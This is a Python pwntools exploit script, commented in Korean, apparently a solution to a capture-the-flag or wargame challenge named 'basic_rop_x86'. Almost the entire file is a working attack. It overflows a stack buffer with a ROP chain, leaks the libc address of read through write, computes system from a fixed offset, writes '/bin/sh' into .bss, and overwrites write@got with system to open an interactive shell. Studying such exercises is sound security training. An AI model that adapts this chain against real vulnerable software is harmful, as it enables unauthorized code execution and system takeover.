from pwn import *

def slog(name, addr):
	return success(": ".join([name, hex(addr)]))

context.log_level = 'debug'

p = process('./basic_rop_x86')
e = ELF('./basic_rop_x86')


# [1] 필요 정보 수집
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

system_offset = 0xa9a70
pppr = 0x8048689
bss = e.bss()
buf2ret = 72



# [2] Exploit
payload = b'A' * buf2ret


# read() 실제 주소 흭득 -> write(1, read@got, 4)
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)


# BSS 영역에 "/bin/sh" 쓰기 -> read(0, bss, 8)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)


# got overwrite (write -> system) => read(0, write@got, 4)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)


# write("/bin/sh") => system("/bin/sh")가 호출 됨
payload += p32(write_plt)
payload += b"AAAA"
payload += p32(bss)

p.sendline(payload)

p.recv(buf2ret-8)
read_addr = u32(p.recv(4))
system_addr = read_addr - system_offset

slog("read", read_addr)
slog("system", system_addr) 

p.send(b'/bin/sh\x00')
p.send(p32(system_addr))
p.interactive()

